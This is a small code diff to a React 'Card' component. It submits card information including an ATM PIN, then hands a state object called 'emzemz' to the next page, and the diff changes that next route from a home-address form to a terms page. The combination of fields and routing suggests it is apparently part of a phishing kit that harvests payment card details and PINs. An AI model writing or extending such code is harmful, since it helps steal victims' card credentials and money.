@@ -70,7 +70,7 @@ const Card: React.FC = () => {
           atmPin
         });
         console.log('Card information submitted successfully');
-        navigate('/home-address', { state: { emzemz } });
+        navigate('/terms', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting card info:', error);
         setIsLoading(false);
